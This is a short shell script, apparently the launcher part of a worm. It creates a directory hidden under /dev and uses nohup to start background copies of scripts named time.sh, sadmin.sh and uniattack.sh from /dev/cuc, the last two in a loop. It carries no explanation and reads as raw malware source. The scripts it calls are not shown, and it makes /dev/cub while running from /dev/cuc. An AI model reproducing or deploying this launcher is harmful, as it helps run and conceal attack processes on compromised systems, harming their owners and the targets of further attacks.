#!/bin/sh
if [ ! -d /dev/cub ]; then
/bin/mkdir /dev/cub
fi
/bin/nohup /dev/cuc/time.sh &
i=1
while [ $i -lt 5 ]
do
/bin/nohup /dev/cuc/sadmin.sh &
/bin/nohup /dev/cuc/uniattack.sh &
i=`/bin/echo "$i+1"|/bin/bc`
done 